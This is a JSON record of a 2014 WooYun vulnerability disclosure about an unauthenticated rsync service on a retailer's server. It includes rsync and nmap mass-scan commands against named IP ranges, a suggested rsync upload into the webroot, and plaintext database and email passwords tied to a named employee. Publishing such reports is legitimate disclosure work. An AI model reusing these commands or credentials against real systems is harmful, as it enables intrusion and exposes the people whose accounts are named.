{"id": 59370, "wybug_id": "wooyun-2014-047689", "wybug_title": "优淘网某服务器rsync配置错误泄漏信息", "wybug_corp": "优淘网", "wybug_author": "l137", "wybug_date": "2014-01-02 16:53", "wybug_open_date": "2014-02-16 16:53", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-02-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 优淘某站点rsync配置未设置访问权限,造成rsync任意下载,任意上传...重要的数据库,邮箱,ssh帐号(貌似是技术部门负责人)的配置信息被硬编码在代码中造成泄漏 详细说明：  同问题描述\nliet@kali:~$ rsync 210.14.138.23::tspweb         \ttspweb filenewtspweb      \tnewtspweb filesystem         \ttspweb file\n找一下配置文件,mssql是可以外网登入的,mysql试了下不行,用邮箱的帐号也可以登入ssh\nliet@kali:~/code/python/study/sec/rsync_hack/210.14.138.23/tspweb/config/tspweb$ lsdatabase.config.php  mail.config.php  page.config.php  router.config.php  smarty.config.php  sync.config.php\n数据库配置文件\n<?php/** * db.config.php * * 数据库配置文件 * * youtao for framework * * @package\tyoutaosystem * @author\thirry(lijinhou@youtao.com) * @since\tversion 1.0 * @time\t2012-6-29 */return array(    'mySqlMaster' => array(        'driver' => 'mysql',        'dbhost' => 'localhost',        'dbname' => 'youtao',        'dbuser' => 'tspyoutaoadmin',        'dbpass' => 'tspyoutaoadmin@WSX',        'dbport' => '3306'    ),    'mySqlRead' => array(    \t'driver' => 'mysql',        'dbhost' => 'localhost',        'dbname' => 'youtao',        'dbuser' => 'tspyoutaoadmin',        'dbpass' => 'tspyoutaoadmin@WSX',        'dbport' => '3306'    ),        'sqlServerMaster' => array(        'driver' => 'mssql',        'dbhost' => '192.168.1.3',        'dbname' => 'youtao',        'dbuser' => 'youtaoasp',        'dbpass' => 'youtaooldwebadmin',        'dbport' => '1433'    ),    'sqlServerRead' => array(        'driver' => 'mssql',        'dbhost' => '192.168.1.3',        'dbname' => 'youtao',        'dbuser' => 'youtaoasp',        'dbpass' => 'youtaooldwebadmin',        'dbport' => '1433'    )    );        /*         return array(         'mySqlMaster' => array(         'driver' => 'mysql',         'dbhost' => 'localhost',         'dbname' => 'youtao',         'dbuser' => 'root',         'dbpass' => 'houhou123',         'dbport' => '3306'         ),         'mySqlRead' => array(         'driver' => 'mysql',         'dbhost' => 'localhost',         'dbname' => 'youtao',         'dbuser' => 'root',         'dbpass' => 'houhou123',         'dbport' => '3306'         )         );         */\n\ncat mail.config.php <?php/** * mail.config.php *  * mail配置文件 * * youtao for framework  * * @package\tyoutaosystem * @author\thirry(lijinhou@youtao.com) * @since\tversion 1.0 * @time\t2012-6-29 */return array(    'mail_charset' => 'utf-8',    'mail_host' => 'smtp.youtao.com',    'mail_username' => 'lijinhou@youtao.com',\t'mail_password' => 'houhou123',\t'mail_fromname' => '优淘官网-第三方销售渠道整合平台   ', //邮箱显示名称\t'mail_from' => 'lijinhou@youtao.com',\t'mail_ishtml' => 'true' //是否支持html邮件，true 或false);?>\nrsync 经常用来同步web部分的代码,rsync控制不好,相当于直接给其他人留了一个任意的上传下载的漏洞,直接rsync -R ./xxx remote:/webroot/ 这个比费劲挖shell简单多了,结合nmapsudo nmap -sS -Pn -T4 -p873 xxx.xxx.0.0/16 -oX out.xml 跟一点自己写的小脚本可以对全网段的rsync弱配置进行检测,已大面积拟补精度上的不足..比如对210.14..0.0/16批量检测下,就得到两个弱配置\n210.14.138.23210.14.152.120\n   漏洞证明：  \n\n邮箱\n\n内网登入\n\n\n\nmsf 测试 mssql可登入\n\n   修复方案：  几条配置,你们可以的   版权声明：转载请注明来源 l137@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}